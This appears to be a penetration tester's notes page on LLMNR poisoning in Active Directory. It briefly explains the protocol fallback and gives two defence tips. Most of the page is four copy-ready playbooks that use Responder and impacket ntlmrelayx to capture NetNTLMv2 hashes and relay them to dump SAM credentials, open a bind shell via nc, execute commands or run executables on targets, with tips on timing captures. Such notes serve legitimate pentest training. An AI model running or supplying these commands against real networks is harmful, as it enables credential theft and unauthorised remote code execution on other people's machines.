# LLMNR Poisoning & Responder

---

## [[active-directory-integrated-domain-name-service|ADIDNS]], LLMNR, & NBT-NS

Active Directory Integrated Domain Name Service (ADIDNS) is a domain name service integrated into Active Directory. Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Windows domain services that act as alternative methods for host identification.

- LLMNR is similar to DNS, allowing hosts on the same network to use name resolution for other hosts
- NBT-NS is used to identify systems on a network by their NetBIOS name

When a host on an Active Directory domain makes a DNS request, they go through the following process:

1. Reach out to the domain's DNS server, which may or may not be integrated into Active Directory via [[active-directory-integrated-domain-name-service|ADIDNS]]. If that fails:
2. Attempt to resolve the hostname via an LLMNR broadcast. If that fails:
3. Attempt to resolve the hostname via NetBIOS

---

## LLMNR Poisoning

* Scenario: a victim machine is trying to connect to some resource on the network using a hostname. They are unable to resolve the IP address of the desired resource.
* As a result, they broadcast an LLMNR request to everyone on the network, requesting the IP address of the hostname.
* An attacker on the network receives the broadcast and responds to it saying, "I know the IP address of that hostname!"
* According to LLMNR, the victim machine has to identify itself to the attacker in order for the attacker to satisfy its request. To identify itself, the victim sends an **NetNTLMv2 hash** to identify itself to the attacker.
* With the victim's **NetNTLMv2 hash** in hand, the attacker has two options:
  1. Crack the victim's **NetNTLMv2 hash** offline
      * Cracking required
  2. Relay the victim's **NetNTLMv2 hash** to gain access to other machines on the network
      * No cracking required
      * SMB signing must be disabled on the network

![LLMNR Poisoning example](llmnr-poisoning.png)

---

## LLMNR Poisoning Defense

* Disable LLMNR & NBT-NS in the network
* Enforce strong password policy

---

## LLMNR Poisoning with Responder

- Must be on the target network
- Best to run in the background
- Have running first thing in the morning and during lunch

See [[responder#Start Responding|Responder]].

---

## Crack NetNTLMv2 Hashes

See [[hashcat#Crack NetNTLMv2 Hashes|Hashcat]].

---

## Relay NetNTLMv2 Hashes to Dump Target SAM

* SMB signing must be disabled on the target
* Relayed user credentials must be administrator on the target

1. Ensure the target(s) have SMB signing disabled

    ```bash
    nmap -Pn --script=smb2-security-mode.nse -p445 $TARGETS
    ```

2. Turn off SMB and HTTP responding within Responder by editing the Responder configuration file

    ```conf
    # /usr/share/Responder/Responder.conf

    ; Servers to start
    ...
    SMB = Off
    ...
    HTTP = Off
    ...
    ```

3. Fire up Responder

    ```bash
    responder -I $INTERFACE_TO_LISTEN_AND_RESPOND_ON -rdwv
    ```

4. Fire up the relay

    ```bash
    cd /usr/share/impacket
    python3 examples/ntlmrelayx.py -tf $TARGETS_FILE -smb2support 
    ```

    * $TARGETS_FILE: file of hostname or IP addresses to attempt to relay the captured hash(es) to

5. Let it run. If Responder catches a credential, ntlmrelayx.py will relay it to the target. If the relay succeeds, ntlmrelayx.py will dump the SAM of the target machine.

6. Don't forget to restore the Responder configuration when you're finished!

---

## Relay NetNTLMv2 Hashes for a Target Shell

* SMB signing must be disabled on the target
* Relayed user credentials must be administrator on the target

1. Ensure the target(s) have SMB signing disabled

    ```bash
    nmap -Pn --script=smb2-security-mode.nse -p445 $TARGETS
    ```

2. Turn off SMB and HTTP responding within Responder by editing the Responder configuration file

    ```conf
    # /usr/share/Responder/Responder.conf

    ; Servers to start
    ...
    SMB = Off
    ...
    HTTP = Off
    ...
    ```

3. Fire up Responder

    ```bash
    responder -I $INTERFACE_TO_LISTEN_AND_RESPOND_ON -rdwv
    ```

4. Fire up the relay

    ```bash
    cd /usr/share/impacket
    python3 examples/ntlmrelayx.py -tf $TARGETS_FILE -smb2support -i
    ```

    * $TARGETS_FILE: file of hostname or IP addresses to attempt to relay the captured hash(es) to

5. Let it run. If Responder catches a credential, ntlmrelayx.py will relay it to the target. If the relay succeeds, ntlmrelayx.py will create an interactive bind shell on the target a forward a local port to the bind shell. The ntlmrelayx.py output will inform you of which local port is forwarded.

6. Connect to the bind shell

    ```bash
    nc -nv 127.0.0.1 $FORWARDED_PORT_FROM_NTLMRELAYX_OUTPUT
    ```

7. Don't forget to restore the Responder configuration when you're finished!

---

## Relay NetNTLMv2 Hashes to Execute a Command

* SMB signing must be disabled on the target
* Relayed user credentials must be administrator on the target

1. Ensure the target(s) have SMB signing disabled

    ```bash
    nmap -Pn --script=smb2-security-mode.nse -p445 $TARGETS
    ```

2. Turn off SMB and HTTP responding within Responder by editing the Responder configuration file

    ```conf
    # /usr/share/Responder/Responder.conf

    ; Servers to start
    ...
    SMB = Off
    ...
    HTTP = Off
    ...
    ```

3. Fire up Responder

    ```bash
    responder -I $INTERFACE_TO_LISTEN_AND_RESPOND_ON -rdwv
    ```

4. Fire up the relay

    ```bash
    cd /usr/share/impacket
    python3 examples/ntlmrelayx.py -tf $TARGETS_FILE -smb2support -c $COMMAND
    ```

    * $TARGETS_FILE: file of hostname or IP addresses to attempt to relay the captured hash(es) to

5. Let it run. If Responder catches a credential, ntlmrelayx.py will relay it to the target. If the relay succeeds, ntlmrelayx.py will execute the command, but you will **not** receive the output.

6. Don't forget to restore the Responder configuration when you're finished!

---

## Relay NetNTLMv2 Hashes to Run a Target-Local Executable

* SMB signing must be disabled on the target
* Relayed user credentials must be administrator on the target

1. Ensure the target(s) have SMB signing disabled

    ```bash
    nmap -Pn --script=smb2-security-mode.nse -p445 $TARGETS
    ```

2. Turn off SMB and HTTP responding within Responder by editing the Responder configuration file

    ```conf
    # /usr/share/Responder/Responder.conf

    ; Servers to start
    ...
    SMB = Off
    ...
    HTTP = Off
    ...
    ```

3. Fire up Responder

    ```bash
    responder -I $INTERFACE_TO_LISTEN_AND_RESPOND_ON -rdwv
    ```

4. Fire up the relay

    ```bash
    cd /usr/share/impacket
    python3 examples/ntlmrelayx.py -tf $TARGETS_FILE -smb2support -e $PATH_TO_TARGET_LOCAL_EXECUTABLE
    ```

    * $TARGETS_FILE: file of hostname or IP addresses to attempt to relay the captured hash(es) to

5. Let it run. If Responder catches a credential, ntlmrelayx.py will relay it to the target. If the relay succeeds, ntlmrelayx.py will run the executable, but you will **not** receive any output.

6. Don't forget to restore the Responder configuration when you're finished!
